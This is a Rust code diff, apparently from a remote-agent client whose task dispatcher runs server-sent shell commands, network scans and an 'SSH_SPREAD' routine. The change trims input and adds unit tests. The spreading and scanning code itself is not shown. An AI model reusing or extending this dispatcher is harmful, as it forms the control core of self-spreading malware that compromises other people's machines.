@@ -237,7 +237,7 @@ pub fn run_task(task: Task) {
     // Add more command types here when supported by server and implemented in client
     match &task.name[..] {
         TERMINAL_CMD => {
-            let child = terminal_command(task.data);
+            let child = terminal_command(task.data.trim().to_string());
             let rt = RunningTask {
                 id: task.id,
                 child,
@@ -257,16 +257,20 @@ pub fn run_task(task: Task) {
             }
         }
         NETWORK_SCAN_CMD => {
+            let trimmed_data = task.data.trim().to_string();
             thread::spawn(|| {
                 network_scan::network_scan(
                     &RUNNING_TASKS,
                     task.id,
-                    task.data);
+                    trimmed_data);
             });
         }
         SSH_SPREAD => {
+            let trimmed_data = task.data.trim().to_string();
             thread::spawn(|| {
-                ssh_spread(&RUNNING_TASKS, task.id, task.data);
+                ssh_spread(&RUNNING_TASKS,
+                           task.id,
+                           trimmed_data);
             });
         }
         _ => {}
@@ -293,8 +297,74 @@ fn terminal_command(command: String) -> Child {
     }
 }
 
+#[cfg(test)]
+mod tests {
+    use std::time::Duration;
+    use super::*;
 
+    /// Sanity check
+    #[test]
+    fn test_terminal_command() {
+        let data = "echo 'hej'".to_string();
+        terminal_command(data);
+    }
 
+    #[test]
+    fn test_running_task_result() {
+        let id = "1";
+        let data = "echo 'hej'".to_string();
+        let result = "hej\n".to_string();
+        let child = terminal_command(data);
+        let mut rt = RunningTask {
+            id: id.to_string(),
+            child,
+        };
+        thread::sleep(Duration::from_secs(1));
+        match rt.get_result() {
+            Some(val) => {
+                assert_eq!(val.id, id);
+                assert_eq!(val.result, result);
+                assert_eq!(val.status, 0);
+            }
+            _ => assert!(false)
+        }
+    }
 
+    #[test]
+    fn test_running_tasks_add_task() {
+        let id = "1";
+        let data = "echo 'hej'".to_string();
+        let result = "hej\n".to_string();
+        let child = terminal_command(data);
+        let mut rt = RunningTask {
+            id: id.to_string(),
+            child,
+        };
+        let mut running_tasks = RunningTasks {
+            running_tasks: vec![],
+            task_results: vec![],
+        };
+        running_tasks.add_task(rt);
+        assert_eq!(running_tasks.running_tasks.len(), 1);
+    }
 
-
+    #[test]
+    fn test_running_tasks_get_completed() {
+        let id = "1";
+        let data = "echo 'hej'".to_string();
+        let result = "hej\n".to_string();
+        let child = terminal_command(data);
+        let mut rt = RunningTask {
+            id: id.to_string(),
+            child,
+        };
+        let mut running_tasks = RunningTasks {
+            running_tasks: vec![],
+            task_results: vec![],
+        };
+        running_tasks.add_task(rt);
+        thread::sleep(Duration::from_secs(1));
+        let completed = running_tasks.get_completed_tasks();
+        assert_eq!(completed.len(), 1);
+    }
+}
